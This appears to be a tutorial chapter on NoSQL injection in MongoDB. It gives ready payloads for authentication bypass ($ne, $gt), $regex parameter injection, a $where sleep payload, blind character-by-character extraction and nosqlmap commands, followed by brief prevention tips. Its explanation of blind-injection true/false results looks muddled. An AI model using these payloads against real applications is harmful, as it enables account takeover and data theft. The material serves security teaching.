# NoSQL Injection

NoSQL injection occurs when user input is inserted into NoSQL database queries without sanitization. Unlike SQLi, NoSQL databases use JSON-like query structures, making injection detection and exploitation different.

## MongoDB Injection

### Authentication Bypass
```javascript
// Vulnerable code
db.users.find({ username: req.body.username, password: req.body.password });

// Payload (JSON)
{ "username": "admin", "password": { "$ne": "" } }

// URL-encoded
username=admin&password[$ne]=

// Using $gt (greater than, matches first user)
username[$gt]=&password[$gt]=
```

### Parameter Injection
```javascript
// If application uses req.query directly
// URL: /api/users?username=admin&password[$regex]=.*

// This becomes:
db.users.find({ "username": "admin", "password": { "$regex": ".*" } });
```

### $where Injection
```javascript
// Vulnerable code
db.users.find({ $where: "this.username == '" + username + "'" });

// Payload
username: "' || sleep(5000) || '"
```

### Boolean-Based Blind Injection
```javascript
// Check if condition is true
// Payload: username[$ne]=nonexistent
// true: no results returned, false: results returned

// Exfiltrate character by character
username[$regex]=^a
username[$regex]=^b
// etc.
```

## Operators

| Operator | Purpose | Example |
|----------|---------|---------|
| `$ne` | Not equal | `password[$ne]=` |
| `$gt` | Greater than | `username[$gt]=` |
| `$regex` | Regex match | `email[$regex]=.*@target.com` |
| `$exists` | Field exists | `field[$exists]=true` |
| `$in` | In array | `role[$in][]=admin` |
| `$nin` | Not in array | `role[$nin][]=user` |
| `$where` | JS expression | `$where=sleep(5000)` |

## NoSQLMap

```bash
nosqlmap --url "https://target.com/api/login" -A login
nosqlmap --url "https://target.com/api/users" -A data
```

## Prevention

1. **Input validation** — Reject `$` and `.` in keys
2. **Use ORM sanitization** — Mongoose strict mode
3. **Parameterized queries** — Avoid string concatenation
4. **Escaping** — Escape special NoSQL operators

---

> **Next**: [Server-Side Request Forgery (SSRF)](05-ssrf.md)
